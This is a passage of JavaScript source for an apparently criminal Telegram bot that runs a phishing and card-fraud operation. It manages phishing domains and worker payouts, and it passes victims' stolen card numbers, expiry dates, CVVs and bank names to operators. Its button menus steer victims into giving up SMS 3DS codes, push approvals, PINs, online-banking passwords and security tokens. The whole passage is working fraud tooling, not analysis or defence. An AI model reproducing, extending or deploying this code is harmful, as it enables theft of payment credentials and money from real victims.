                str += `${i+1}. #${res[i].tag} | <a href="tg://user?id=${res[i].tgID}">${res[i].tgID}</a>\n`
            }

            await q.replyWithHTML(str, {
                reply_markup: {
                    inline_keyboard: inline_arr
                }
            })
        })
    } else if (data.includes('admin_getPRO')) {
        await account.findOne({ tgID: data.split(' ')[1] }).lean().then(async (res) => {
            await q.replyWithHTML(`🦣 <b>Воркер:</b> #${res.tag}\n\n<b>🆔 ID:</b> ${res.tgID}\n<b>⚖️ Ставка:</b> ${(res.percent != undefined) ? res.percent : 60}%\n🥷 <b>PRO:</b> ${(res.status == 'Воркер') ? 'Воркер' : (res.status == 'ПРО Воркер') ? 'ПРО Воркер' : (res.status == undefined) ? 'Воркер' : 'Воркер'}\n\n<b>💸 Профитов:</b> ${res.total_profits}\n<b>💸 Профитов с наставником:</b> ${res.profits_with_teacher}`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🛑 Заблокировать', callback_data: `Заблокировать воркера` }],
                        [{ text: `⚙️ Изменить тэг`, callback_data: `admin_changeTag ${res.tgID}` }],
                        [{ text: '🧑‍🏫 Удалить наставника', callback_data: `admin_teacherdelete ${res.tgID}` }],
                        [{ text: '💲 Изменить процент', callback_data: `admin_percent ${res.tgID}` }],
                        [{ text: '🔥 Выдать PRO доступ', callback_data: `admin_proAcces ${res.tgID}` }],
                        [{ text: '🗑 Удалить все объявления', callback_data: `admin_deleteAll ${res.tgID}` }],
                        [{ text: '◀️ Назад', callback_data: `⬅️ Назад` }]
                    ]
                }
            })
        })
    } else if (data.includes('admin_teacherdelete')) {
        await account.findOneAndUpdate({ tgID: data.split(' ')[1] }, { $set: { teacher: 'Отсутствует' } },{ new: true }).lean().then(async (res) => {
            if (res) {
                await q.replyWithHTML('<b>🧑‍🏫 Воркер было успешно убран от наставника</b>')
            }
        })
    } else if (data.includes('admin_deleteAll')) {
        let count = 0
        await receive.deleteMany({ tgID: data.split(' ')[1] }).then(async (res) => {
            count += res.deletedCount
            await bbc.deleteMany({ tgID: data.split(' ')[1] }).then(async (res) => {
                count += res.deletedCount
                await q.replyWithHTML(`🗑 <b>У воркера</b> <code>${data.split(' ')[1]}</code> <b>было удалено</b> <code>${count}</code> <b>объявлений. Спасибо, что очищаете базу от МуСоРа</b>`)
            })
        })
    } else if (data.includes('admin_percent')) {
        q.scene.enter('upPercent_scene')
    } else if (data == 'admin_TeacherList') {
        await teacher.find({}).lean().then(async (res) => {
            let teachers_arr = []
            for (let i = 0; i < res.length; i++) {
                teachers_arr.push(
                    Array({
                        text: `${res[i].tgUsername}`,
                        callback_data: `teacherAD_${res[i].tgID}`
                    })
                )
            }

            teachers_arr.push(Array({ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }))

            q.editMessageCaption('👨‍🏫 <b>Список наставников:</b>', {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: teachers_arr
                }
            })
        })
    } else if (data.includes('teacherAD_')) {
        await teacher.findOne({ tgID: data.split('_')[1] }).lean().then(async (res) => {
            await q.replyWithHTML(`🧑‍🏫 <b>Наставник @${res.tgUsername}</b>\n<b>👨‍🎓 Учеников:</b> <code>${res.count}</code>\n\n💸 <b>Кол-во профитов с наставником:</b> <code>${res.profits_count}</code>\n<b>💸 Сумма профитов с наставником:</b> <code>${res.profits_rub}</code>`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '⚒ Изменить описание', callback_data: `teacherChange ${data.split('_')[1]}` }],
                        [{ text: '🗑 Удалить наставника', callback_data: `teacherDelete ${data.split('_')[1]}` }]
                    ]
                }
            })
        })
    } else if (data.includes('teacherDelete')) {
        await teacher.findOneAndDelete({ tgID: data.split(' ')[1] }).then(async (res) => {
            await q.replyWithHTML(`🧑‍🏫 <b>Наставник @${data.split(' ')[1]} был успешно удалён</b>`)
            await account.updateMany({ teacher: res.tgUsername }, { teacher: 'Отсутствует' })
        })
    } else if (data.includes('teacherChange')) {
        q.scene.enter('changeDescriptionTeacher')
    } else if (data.includes('admin_changeTag')) {
        q.scene.enter('admin_ChangeTag')
    }

    /* domains callbacks */
    if (data == 'domains_addDomain') {
        q.scene.enter('admin_addDomain')
    } 
    
    if (data == 'admin_domainsList') {
        await domains.find({}).lean().then(async (res) => {
            if (res.length == 0) {
                await q.replyWithHTML('<b>⚙️ Пока что в базе данных доменов нету</b>...')
            } else {
                let inline_arr = []
                for (let i = 0; i < res.length; i++) {
                    inline_arr.push(Array({ text: `${res[i].domain} | Active: ${res[i].active} | Pro: ${res[i].pro}`, callback_data: `domain:${res[i].domain}` }))
                }

                await q.replyWithHTML('<b>⚙️ Список подключённых доменов. Нажмите на любой из них, чтобы установить/удалить его.</b>', {
                    reply_markup: {
                        inline_keyboard: inline_arr
                    }
                })
            }
        })
    } 
    
    if (data == 'domains_addConfig') {
        
    } 
    
    if (data == 'domains_addGuard') {
        
    } 
    
    if (data.includes('domain:')) {
        await domains.findOne({ domain: data.split(':')[1] }).lean().then(async (res) => {
            if (res) {
                await q.replyWithHTML(`<b>⚙️ Домен:</b> <code>${data.split(':')[1]}</code>`, {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '✅ Выбрать для обычных!', callback_data: `domainS:${data.split(':')[1]}` }],
                            [{ text: '✅ Выбрать для PRO!', callback_data: `domainSPRO:${data.split(':')[1]}` }],
                            [{ text: '🚫 Удалить!', callback_data: `domainD:${data.split(':')[1]}` }]
                        ]
                    }
                })
            }
        })
    } 
    
    if (data.includes('domainS:')) {
        await domains.findOneAndUpdate({ domain: data.split(':')[1] }, { $set: { active: 'yes', pro: 'no' } }, { new: true }).lean().then(async (res) => {
            await q.replyWithHTML(`⚙️ <b>Домен</b> <code>${data.split(':')[1]}</code> <b>был успешно установлен!</b>`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                    ]
                }
            })
        })
    } 

    if (data.includes('domainSPRO')) {
        await domains.findOneAndUpdate({ domain: data.split(':')[1] }, { $set: { active: 'yes', pro: 'yes' } }, { new: true }).lean().then(async (res) => {
            await q.replyWithHTML(`⚙️ <b>Домен</b> <code>${data.split(':')[1]}</code> <b>был успешно установлен!</b>`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                    ]
                }
            })
        })
    }
    
    if (data.includes('domainD:')) {
        await domains.findOneAndDelete({ domain: data.split(':')[1] }).then(async (res) => {
            await q.replyWithHTML(`⚙️ <b>Домен</b> <code>${data.split(':')[1]}</code> <b>был успешно удалён!</b>`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                    ]
                }
            })
        })
    }

    /* vbiver data */
    if (data == 'vbiverUP') {
        await q.telegram.sendMessage(-1001759957604, `👨‍💻 <b>@${q.from.username} сел на вбив всех стран</b>`, { parse_mode: 'HTML' })
        fs.writeFile(`database/vbivers/on_vbiv/${q.from.username}`, '', async (err) => {
            if (!err) {
                await q.answerCbQuery('🤖 Вы встали на вбив.', { show_alert: true })
            }
        })
    } 
    
    if (data == 'vbiverDOWN') {
        await q.telegram.sendMessage(-1001759957604, `👨‍💻 <b>@${q.from.username} ушёл со вбив всех стран</b>`, { parse_mode: 'HTML' })
        fs.unlink(`database/vbivers/on_vbiv/${q.from.username}`, async (err) => {
            if (!err) {
                await q.answerCbQuery('🤖 Вы ушли со вбива.', { show_alert: true })
            }
        })
    }

    /* smser data */
    if (data == 'smserUP') {
        await q.telegram.sendMessage(-1001759957604, `🥷 <b>@${q.from.username} сел на отправку смс</b>`, { parse_mode: 'HTML' })
        fs.writeFile(`database/smsers/${q.from.username}`, '', async (err) => {
            if (!err) {
                await q.answerCbQuery('🤖 Вы встали на отправку смс.', { show_alert: true })
            }
        })
    } 
    
    if (data == 'smserDOWN') {
        await q.telegram.sendMessage(-1001759957604, `🥷 <b>@${q.from.username} ушёл с отправки смс</b>`, { parse_mode: 'HTML' })
        fs.unlink(`database/smsers/${q.from.username}`, async (err) => {
            if (!err) {
                await q.answerCbQuery('🤖 Вы ушли с отправки смс.', { show_alert: true })
            }
        })
    }
    
    /* carder cbqcks */
    if (data.includes('vbiv_get')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOneAndUpdate({ link: id }, { $set: { vbiver: q.from.username } }, { new: true }).lean().then(async (res) => {
            await q.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n💳 <b>Карту взяли на вбив</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '💳 Написать вбиверу 💳', url: `https://t.me/${q.from.username}` }]
                    ]
                }
            }).catch(async (e) => {
                loggy.warn(`problem with telegram => ${e}`)
            })

            await q.telegram.sendMessage(q.from.id, `<b>${res_db.service}</b>:\n<b>💳 Вы взяли на вбив</b>\n\n📬 <b>ID:</b> <code>${id}</code>\n\n<b>💳 Карта:</b> ${res.card_number}\n<b>💳 Дата:</b> ${res.card_expiration}\n<b>💳 CVV:</b> ${data.split(' ')[2]}\n<b>💳 Банк:</b> ${res.bank}\n\n👨🏻‍💻 <b>Воркер:</b> @${res_db.tgUsername} | ${res_db.tgID}`, {
                parse_mode: 'HTML', 
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '⚙️ Статус: Нигде', callback_data: 'statusssssssss' }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }]
                    ]
                }
            })
            
            await q.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `💳 Взял: ${q.from.username} 💳`, url: `https://t.me/${q.from.username}` }],
                    [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                ]
            }).catch(async (e) => {
                loggy.warn(`problem with telegram => ${e}`)
            })
        })
    }

    if (data.includes('vbiv_3ds')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOne({ link: id }).lean().then(async (res) => {
            if ((!res) || (q.from.username == res.vbiver)) {
                await q.telegram.sendMessage(config.bot.admin_logs, `⚡️ <b>Перенаправление мамонта</b>\n\n💡 ID: <code>${id}</code>\n💳 <b>Вбивер:</b> ${q.from.username}\n💳 <b>Действие:</b> <i>На 3DS</i>`, { parse_mode: 'HTML' })

                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: '⚙️ Статус: На 3DS', callback_data: 'statusssssssss' }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                    ]
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await bot.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n📨 <b>Мамонту отправлено СМС сообщение, ожидаем ввод кода</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '💳 Написать вбиверу 💳', url: `https://t.me/${q.from.username}` }]
                        ]
                    }
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await logs.findOneAndUpdate({ link: id }, { method: '3ds'  }, { new: true }).lean()
            } else {
                await q.answerCbQuery(`Только @${res.vbiver} может управлять логом`, { show_alert: true })
            }
        })
    }

    if (data.includes('vbiv_push')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()
        
        await cards.findOne({ link: id }).lean().then(async (res) => {
            if ((!res) || (q.from.username == res.vbiver)) {
                await q.telegram.sendMessage(config.bot.admin_logs, `⚡️ <b>Перенаправление мамонта</b>\n\n💡 ID: <code>${id}</code>\n💳 <b>Вбивер:</b> ${q.from.username}\n💳 <b>Действие:</b> <i>На PUSH</i>`, { parse_mode: 'HTML' })

                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: '⚙️ Статус: На PUSH', callback_data: 'statusssssssss' }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                    ]
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await bot.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n📲 <b>Мамонту отправлено пуш уведомление, ожидаем подтверждения операции</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '💳 Написать вбиверу 💳', url: `https://t.me/${q.from.username}` }]
                        ]
                    }
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await logs.findOneAndUpdate({ link: id }, { method: 'push' } , { new: true }).lean()
            } else {
                await q.answerCbQuery(`Только @${res.vbiver} может управлять логом`, true)
            }
        })
    }

    if (data.includes('vbiv_PINonl')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOne({ link: id }).lean().then(async (res) => {
            if ((!res) || (q.from.username == res.vbiver)) {
                await q.telegram.sendMessage(config.bot.admin_logs, `⚡️ <b>Перенаправление мамонта</b>\n\n💡 ID: <code>${id}</code>\n💳 <b>Вбивер:</b> ${q.from.username}\n💳 <b>Действие:</b> <i>На вводе PIN ONLINE</i>`, { parse_mode: 'HTML' })

                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: '⚙️ Статус: На вводе PIN ONLINE', callback_data: 'statusssssssss' }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                    ]
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await bot.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n🔑 <b>Мамонт направлен на ввод PIN Online</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '💳 Написать вбиверу 💳', url: `https://t.me/${q.from.username}` }]
                        ]
                    }
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await logs.findOneAndUpdate({ link: id }, { $set: { method: 'PINonl' } }, { new: true }).lean()
            } else {
                await q.answerCbQuery(`Только @${res.vbiver} может управлять логом`, true)
            }
        })
    }

    if (data.includes('vbiv_PINcard')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOne({ link: id }).lean().then(async (res) => {
            if ((!res) || (q.from.username == res.vbiver)) {
                await q.telegram.sendMessage(config.bot.admin_logs, `⚡️ <b>Перенаправление мамонта</b>\n\n💡 ID: <code>${id}</code>\n💳 <b>Вбивер:</b> ${q.from.username}\n💳 <b>Действие:</b> <i>На вводе PIN Карты</i>`, { parse_mode: 'HTML' })

                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: '⚙️ Статус: На вводе PIN Карты', callback_data: 'statusssssssss' }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                    ]
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await bot.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n🔑 <b>Мамонт направлен на ввод PIN Карты</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '💳 Написать вбиверу 💳', url: `https://t.me/${q.from.username}` }]
                        ]
                    }
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await logs.findOneAndUpdate({ link: id }, { $set: { method: 'PINcard' } }, { new: true }).lean()
            } else {
                await q.answerCbQuery(`Только @${res.vbiver} может управлять логом`, true)
            }
        })
    }

    if (data.includes('vbiv_fake')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOne({ link: id }).lean().then(async (res) => {
            if ((!res) || (q.from.username == res.vbiver)) {
                await q.telegram.sendMessage(config.bot.admin_logs, `⚡️ <b>Перенаправление мамонта</b>\n\n💡 ID: <code>${id}</code>\n💳 <b>Вбивер:</b> ${q.from.username}\n💳 <b>Действие:</b> <i>На инфе, что фейк</i>`, { parse_mode: 'HTML' })

                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: '⚙️ Статус: На инфе, что фейк', callback_data: 'statusssssssss' }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                    ]
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await bot.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n💳 <b>Мамонт ввёл фейковую карту или код, отправили на смену</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '💳 Написать вбиверу 💳', url: `https://t.me/${q.from.username}` }]
                        ]
                    }
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await logs.findOneAndUpdate({ link: id }, { $set: { method: 'fake' } }, { new: true }).lean()
            } else {
                await q.answerCbQuery(`Только @${res.vbiver} может управлять логом`, true)
            }
        })
    }

    if (data.includes('vbiv_change')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOneAndUpdate({ link: id }, { $set: { vbiver: q.from.username } }, { new: true }).lean().then(async (res) => {
            await q.telegram.sendMessage(config.bot.admin_logs, `⚡️ <b>Перенаправление мамонта</b>\n\n💡 ID: <code>${id}</code>\n💳 <b>Вбивер:</b> ${q.from.username}\n💳 <b>Действие:</b> <i>На инфе о смене</i>`, { parse_mode: 'HTML' })

            await q.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: '⚙️ Статус: На инфе о смене', callback_data: 'statusssssssss' }],
                    [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                    [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                    [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                    [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                    [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                    [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                    [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                    [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                ]
            }).catch(async (e) => {
                loggy.warn(`problem with telegram => ${e}`)
            })

            await bot.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n💳 <b>Мамонт направлен на смену карту</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '💳 Написать вбиверу 💳', url: `https://t.me/${q.from.username}` }]
                    ]
                }
            }).catch(async (e) => {
                loggy.warn(`problem with telegram => ${e}`)
            })

            await logs.findOneAndUpdate({ link: id }, { $set: { method: 'change' } }, { new: true }).lean()
        })
    }

    if (data.includes('vbiv_lowmoney')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOneAndUpdate({ link: id }, { $set: { vbiver: q.from.username } }, { new: true }).lean().then(async (res) => {
            await q.telegram.sendMessage(config.bot.admin_logs, `⚡️ <b>Перенаправление мамонта</b>\n\n💡 ID: <code>${id}</code>\n💳 <b>Вбивер:</b> ${q.from.username}\n💳 <b>Действие:</b> <i>На точном балансе</i>`, { parse_mode: 'HTML' })

            await q.telegram.sendMessage(q.from.id, `<b>${res_db.service}</b>:\n<b>💳 Вы взяли на вбив</b>\n\n📬 <b>ID:</b> <code>${id}</code>\n\n<b>💳 Карта:</b> ${res.card_number}\n<b>💳 Дата:</b> ${res.card_expiration}\n<b>💳 CVV:</b> ${res.card_cvv}\n<b>💳 Банк:</b> ${res.bank}\n\n👨🏻‍💻 <b>Воркер:</b> @${res_db.tgUsername} | ${res_db.tgID}`, {
                parse_mode: 'HTML', 
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '⚙️ Статус: На точном балансе', callback_data: 'statusssssssss' }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
